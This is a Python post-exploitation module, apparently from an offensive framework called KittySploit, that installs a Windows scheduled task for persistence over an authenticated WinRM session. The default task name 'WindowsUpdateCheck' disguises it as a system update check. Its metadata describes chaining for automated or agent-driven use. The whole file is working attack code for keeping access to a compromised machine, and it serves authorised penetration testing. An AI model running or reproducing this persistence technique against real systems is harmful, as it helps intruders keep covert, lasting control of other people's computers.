#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Persistence Scheduled Task",
		"description": "Create a scheduled task persistence entry through a WinRM session",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1053.005/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "persistence"],
			"expected_requests": 2,
			"reversible": True,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["persistence"],
				"suggested_followups": [],
			},
		},
	}

	task_name = OptString("WindowsUpdateCheck", "Scheduled task name", True)
	command = OptString("", "Command/binary path to run", True)
	arguments = OptString("", "Optional arguments for the command", False)
	trigger = OptChoice(
		"onlogon",
		"Trigger type",
		True,
		choices=["onlogon", "onstart", "minute", "hourly", "daily"],
	)
	interval = OptInteger(5, "Interval minutes (for minute trigger)", False)
	force = OptBool(True, "Overwrite existing task with same name", False)
	remove = OptBool(False, "Remove the task instead of creating it", False)

	def run(self):
		try:
			name = str(self.task_name or "").strip()
			if not name:
				raise ProcedureError(FailureType.ConfigurationError, "task_name is required")

			if bool(self.remove):
				print_status(f"Removing scheduled task '{name}'...")
				out = self.cmd_execute(f'schtasks /Delete /TN "{name}" /F') or ""
				print_info(out.strip() or "(no output)")
				print_success("Scheduled task removal requested")
				return True

			cmd = str(self.command or "").strip()
			if not cmd:
				raise ProcedureError(FailureType.ConfigurationError, "command is required")
			args = str(self.arguments or "").strip()
			tr = f"{cmd} {args}".strip() if args else cmd
			trigger = str(self.trigger or "onlogon").lower()

			if trigger == "onlogon":
				sc, mo = "/SC ONLOGON", ""
			elif trigger == "onstart":
				sc, mo = "/SC ONSTART", ""
			elif trigger == "hourly":
				sc, mo = "/SC HOURLY", ""
			elif trigger == "daily":
				sc, mo = "/SC DAILY", ""
			else:
				sc = "/SC MINUTE"
				mo = f"/MO {max(1, int(self.interval or 5))}"

			force_flag = "/F" if bool(self.force) else ""
			create_cmd = f'schtasks /Create /TN "{name}" /TR "{tr}" {sc} {mo} {force_flag}'.strip()
			print_status(f"Creating scheduled task '{name}'...")
			print_info(f"Command: {create_cmd}")
			out = self.cmd_execute(create_cmd) or ""
			print_info(out.strip() or "(no output)")
			if "success" in out.lower() or "réussi" in out.lower() or "exitoso" in out.lower() or not out.strip():
				print_success("Scheduled task persistence installed")
			else:
				print_warning("Task creation returned unexpected output — verify manually")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM scheduled task error: {exc}")
